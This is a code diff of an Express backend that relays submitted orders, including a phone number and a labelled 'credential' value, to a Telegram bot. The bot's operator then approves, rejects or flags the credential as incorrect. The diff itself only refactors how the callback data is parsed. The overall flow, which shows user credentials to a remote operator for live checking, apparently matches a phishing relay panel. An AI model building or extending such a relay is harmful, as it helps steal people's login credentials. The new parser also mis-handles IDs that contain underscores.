@@ -108,6 +108,7 @@ app.post('/api/submit-order', async (req, res) => {
                         `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const encodedId = encodeURIComponent(uniqueId || 'N/A');
 
         await sendToTelegram(telegramUrl, {
             chat_id: CHAT_ID,
@@ -116,11 +117,11 @@ app.post('/api/submit-order', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodeURIComponent(uniqueId || 'N/A')}` },
-                        { text: "❌ Reject", callback_data: `reject_${phone}_${encodeURIComponent(uniqueId || 'N/A')}` }
+                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodedId}` },
+                        { text: "❌ Reject", callback_data: `reject_${phone}_${encodedId}` }
                     ],
                     [
-                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${encodeURIComponent(uniqueId || 'N/A')}` }
+                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${encodedId}` }
                     ]
                 ]
             }
@@ -158,27 +159,35 @@ app.post('/api/telegram-webhook', async (req, res) => {
             let uniqueId = 'N/A';
             let messageTitle = 'Processed Request';
 
-            if (callbackData.startsWith('approve_')) {
-                const parts = callbackData.replace('approve_', '').split('_');
-                phone = parts[0];
-                uniqueId = decodeURIComponent(parts.slice(1).join('_')) || 'N/A';
-                orderStatuses[phone] = 'approved';
-                actionText = 'Approved ✅';
-                messageTitle = 'Approval Result';
-            } else if (callbackData.startsWith('reject_')) {
-                const parts = callbackData.replace('reject_', '').split('_');
-                phone = parts[0];
-                uniqueId = decodeURIComponent(parts.slice(1).join('_')) || 'N/A';
-                orderStatuses[phone] = 'rejected';
-                actionText = 'Rejected ❌';
-                messageTitle = 'Rejection Result';
-            } else if (callbackData.startsWith('wrong_id_')) {
-                const parts = callbackData.replace('wrong_id_', '').split('_');
-                phone = parts[0];
-                uniqueId = decodeURIComponent(parts.slice(1).join('_')) || 'N/A';
-                orderStatuses[phone] = 'wrong_id';
-                actionText = 'Incorrect Credential ⚠️';
-                messageTitle = 'Credential Error Result';
+            // Safely parse callback data formatted as prefix_phone_encodedUniqueId
+            if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('wrong_id_')) {
+                const prefix = callbackData.startsWith('approve_') ? 'approve_' : (callbackData.startsWith('reject_') ? 'reject_' : 'wrong_id_');
+                const remainder = callbackData.replace(prefix, '');
+                
+                // The phone number format is like "+232 XXX XXX XXX" (contains spaces). Let's extract the phone and the encoded uniqueId safely.
+                // Since phone starts with '+' and has spaces, let's look for where the encoded part begins (after the phone string).
+                // Or easier: split by the first occurrence of '+' if we know the structure, or look for encoded items.
+                // Let's find phone dynamically:
+                const lastUnderscoreIndex = remainder.lastIndexOf('_');
+                if (lastUnderscoreIndex !== -1) {
+                    phone = remainder.substring(0, lastUnderscoreIndex);
+                    const encodedId = remainder.substring(lastUnderscoreIndex + 1);
+                    uniqueId = decodeURIComponent(encodedId) || 'N/A';
+                }
+
+                if (callbackData.startsWith('approve_')) {
+                    orderStatuses[phone] = 'approved';
+                    actionText = 'Approved ✅';
+                    messageTitle = 'Approval Result';
+                } else if (callbackData.startsWith('reject_')) {
+                    orderStatuses[phone] = 'rejected';
+                    actionText = 'Rejected ❌';
+                    messageTitle = 'Rejection Result';
+                } else if (callbackData.startsWith('wrong_id_')) {
+                    orderStatuses[phone] = 'wrong_id';
+                    actionText = 'Incorrect Credential ⚠️';
+                    messageTitle = 'Credential Error Result';
+                }
             }
 
             const countryFlag = "🇸🇱";
